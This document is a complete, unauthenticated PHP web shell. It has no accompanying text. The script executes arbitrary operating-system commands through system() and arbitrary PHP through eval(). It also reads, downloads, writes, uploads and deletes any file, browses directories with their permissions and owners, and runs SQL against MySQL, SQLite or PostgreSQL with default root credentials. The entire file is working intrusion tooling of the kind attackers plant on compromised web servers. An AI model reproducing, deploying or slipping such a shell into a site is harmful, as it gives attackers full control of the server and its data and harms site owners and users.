<?php
ini_set('display_errors', 1);
error_reporting(E_ERROR);
$dark = false;
$out = '';

if(!empty($_GET['dl']) )
{
    $f = $_GET['dl'];
    if (is_readable($f))
    {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    }
    else
        $out .= '<b>Error reading file ' . GetPath($f) . '</b>';
}
$out .= '<!DOCTYPE html><html class="'.(($dark)?'h':'').'"><head><meta charset="utf-8"></head>
<body><style type="text/css">html {font-size: 12px;font-family: "Lucida Console", Courier, monospace;}
.row::after { content: "";display: table; clear: both;}
.a1 { background: #999; color: #000; } .a2 { background: #ccc; color: #000; }
@media only screen and (min-width: 25em) { c1,c2,c3,c4 { display: block; float:left; min-height: 0.125rem; }
c1 { width: 90px; } c2 { width: 200px; overflow: hidden; text-overflow: ellipsis; } c4 { width: 300px; } }
.c { width: 800px; height:400px; border:1px solid #000; overflow: auto; resize: both; }
.h { background: #000; color: #00FF00; .c,textarea, input { background-color: #666; } }</style>';

function GetPath($f)
{
    $p = realpath($f);
    if (!$p)
    {
        if (!empty($f) && $f[0] == '/') $p = $f;
        else
        {
            if (substr($f,0,2) == './') $f = substr($f,2);
            $p = getcwd() . '/' . $f;
        }
    }
    return $p;
}

function GetPerms($p)
{
    switch($p&0xF000){case 0xC000:$i='s';break;case 0xA000:$i='l';break;case 0x8000:$i='-';break;case 0x6000:$i='b';break;case 0x4000:$i='d';break;case 0x2000:$i='c';break;case 0x1000:$i='p';break;default:return"";}
    $i.=(($p&0x0100)?'r':'-');$i.=(($p&0x0080)?'w':'-');$i.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
    $i.=(($p&0x0020)?'r':'-');$i.=(($p&0x0010)?'w':'-');$i.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
    $i.=(($p&0x0004)?'r':'-');$i.=(($p&0x0002)?'w':'-');$i.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
    return $i;
}

function GetSize($b)
{
    $u = array("b", "Kb", "Mb", "Gb"); $i = 0;
    while ($b > 1024) { $b = $b / 1024; $i++; }
    return round($b,2) . $u[$i];
}

if(!empty($_POST['cmd'])) { $out .= "<pre class='c'>"; system($_POST['cmd']); $out .= "</pre>"; }

if(!empty($_POST['php'])) { $out .= '<pre>'; eval($_POST['php']); $out .= '</pre>'; }

if(!empty($_FILES['f']['name']))
{
    $d = ((!empty($_POST['dir'])) ? $_POST['dir']:'.')  . '/' . $_FILES['f']['name'];
    $out .= '<b>' . ((move_uploaded_file($_FILES['f']['tmp_name'], $d)) ? 'Successfully uploaded ' : 'Error uploading ') . $d .'</b>';
}

$f = (!empty($_GET['read'])) ? $_GET['read'] : ((!empty($_POST['read'])) ? $_POST['read'] : false);
if($f)
{
    $out .= '<b>Reading file ' . GetPath($f) .'</b><br>';
    $strFile = highlight_file($f, true);
    $out .= (($strFile === false) ? "<b>Error opening ". $f . '</b>' : '<div class="c">'. $strFile .'</div>');
}

if(!empty($_POST['write']))
{
    $out .= '<b>' . ((file_put_contents($_POST['write'], $_POST['content']) === false) ? 'Error writing ' : 'Successfully wrote ') . GetPath($_POST['write']) . '</b>';
}

if(!empty($_GET['delete']))
{
    $f = $_GET['delete'];
    $out .= '<b>' . ((unlink($f) === false) ? 'Error deleting ' : 'Successfully deleted ') . $f . '</b>';
}

if(!empty($_POST['query']))
{
    if ($_POST['dbms'] == 'sqlite' && file_exists($_POST['db'])) $dsn = 'sqlite:' . $_POST['db'];
    else $dsn = $_POST['dbms'] . ':dbname='. $_POST['db'] .';host='. $_POST['server'] . ';port=' . $_POST['port'];

    $dbh = new PDO($dsn, $_POST['user'], $_POST['pwd']);
    $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
    $stmt = $dbh->query($_POST['query']);

    if ($stmt) {
        $out .= '<table border="1"><tr>';
        for ($i = 0; $i < $stmt->columnCount(); $i++) { $col = $stmt->getColumnMeta($i); $out .= '<td><b>'. $col['name'] .'</b></td>'; }
        $out .= '</tr>';

        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $out .= '<tr>';
            foreach ($row as $value) $out .= '<td>'. $value .'</td>';
            $out .= '</tr>';
        }
        $out .= '</table>';
    }
    else $out .= '<b>Error '. $dbh->errorInfo()[1] .' : '. $dbh->errorInfo()[2] . '</b>';
}

$dir = realpath(!empty($_GET['dir']) ? $_GET['dir'] : '.');
$tab = scandir($dir);

$dirs = array();
$files = array();
for ($i=0; $i < sizeof($tab); $i++) { 
    if (is_dir($dir . '/' . $tab[$i])) $dirs[] = $tab[$i];
    else $files[] = $tab[$i];
}
sort($dirs, SORT_STRING | SORT_FLAG_CASE);
sort($files, SORT_STRING | SORT_FLAG_CASE);
$tab = array_merge($dirs, $files);

if ($tab) 
{
    $out .= "<br><br><b>Listing of " . $dir . '</b><br><br><div style="min-width: 600px">';
    $i = 0;
    foreach ($tab as $x)
    {
        $f = realpath($dir.'/'.$x);
        $out .= '<div class="row '. ((++$i % 2 == 0) ? 'a1':'a2') .'">';
        $out .= '<c1>' . GetPerms(fileperms($f)) . ' </c1>' .
        '<c2>'. posix_getpwuid(fileowner($f))['name'] . ':' . posix_getpwuid(filegroup($f))['name'] . '</c2>' .
        '<c2>' . $x . '</c2>';

        if (is_dir($f)) $out .= "<c1></c1><c6> [<a href='$f'>open URL</a>] [<a href='?dir=$f'>browse</a>] </c6>";

        else $out .= '<c1>'. GetSize(filesize($f)) .'</c1>' .
                    "<c6>[<a href='$f'>open</a>] [<a href='?dir=$dir&read=$f'>read</a>]
                    [<a href='?dir=$dir&dl=$f'>download</a>] [<a href='?dir=$dir&edit=$f'>edit</a>]
                    [<a href='?dir=$dir&delete=$f' onclick='return confirm(\"Are you sure?\")'>delete</a>]</c6>";

        $out .= '</div>';
    }
    $out .= '</div>';
}
else
    $out .= "<b>Can't open directory ". $dir ."</b>";


$f = $c = '';
if(isset($_GET['edit']))
{
    $f = $_GET['edit'];
    $c = htmlentities(file_get_contents($f));
}

echo $out;
?>

<br><hr><br>

<a href="?dir=.">DIR BROWSER</a><br><br>

<form action="?dir=<?=$dir;?>" METHOD="POST">
CMD <input type="text" name="cmd" placeholder="ls -al"><input type="submit">
</form><br>
<form action="?dir=<?=$dir;?>" METHOD="POST">
PHP <input type="text" name="php" placeholder="phpinfo();"><input type="submit">
</form><br>
<form action="?dir=<?=$dir;?>" METHOD="POST" enctype="multipart/form-data">
Upload <input name="f" type="file"> to dir: <input type="text" name="dir" value="." placeholder="path"><input type="submit">
</form><br>
<form action="?dir=<?=$dir;?>" METHOD="GET">
Download <input type="text" name="dl" placeholder="file"><input type="submit">
</form><br>
<form action="?dir=<?=$dir;?>" METHOD="POST">
Read <input type="text" name="read" placeholder="file"><input type="submit">
</form><br>
<form action="?dir=<?=$dir;?>" METHOD="POST">
Write <input type="text" name="write" placeholder="file" value="<?=$f; ?>"><br>
<textarea name="content" cols="80" rows="5" placeholder="content"><?=$c; ?></textarea><input type="submit">
</form><br>
<form action="?dir=<?=$dir;?>" METHOD="POST">

<select name="dbms">
    <option>mysql</option>
    <option>sqlite</option>
    <option>pgsql</option>
</select><br>

<input type="text" name="server" value="<?=(!empty($_POST['server'])) ? $_POST['server'] : '127.0.0.1'; ?>">
<input type="text" name="port" value="<?=(!empty($_POST['port'])) ? $_POST['port'] : '3306'; ?>"><br>
<input type="text" name="user" value="<?=(!empty($_POST['user'])) ? $_POST['user'] : 'root'; ?>">
<input type="text" name="pwd" value="<?=(!empty($_POST['pwd'])) ? $_POST['pwd'] : ''; ?>" placeholder="password"><br>
<input type="text" name="db" value="<?=(!empty($_POST['db'])) ? $_POST['db'] : ''; ?>" placeholder="database"><br>
<textarea name="query" cols="80" rows="5" placeholder="query"></textarea><input type="submit">
</form>
</body></html>